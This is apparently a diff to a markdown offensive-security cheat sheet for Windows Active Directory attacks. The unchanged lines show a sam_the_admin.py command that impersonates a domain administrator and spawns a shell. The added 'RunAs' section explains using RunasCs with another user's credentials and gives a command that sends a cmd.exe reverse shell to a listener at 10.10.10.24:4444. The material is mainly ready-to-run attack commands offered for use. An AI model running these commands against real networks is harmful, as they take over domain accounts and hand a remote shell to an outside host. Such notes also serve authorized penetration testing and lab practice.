@@ -53,3 +53,9 @@ Impersonate DA from standard domain user. Based on <https://github.com/WazeHell/
 ```bash
 python3 sam_the_admin.py -domain-netbios NETBIOS_NAME -dc-ip IP_DC -shell 'DOMAIN/USERNAME:PASSWORD'
 ```
+
+## RunAs
+If you get a revershell a something and you have credentials of another user, just use this tool : https://github.com/antonioCoco/RunasCs/tree/master. You will get a proper reverse shell executed by the specified user.
+```powershell
+RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
+```
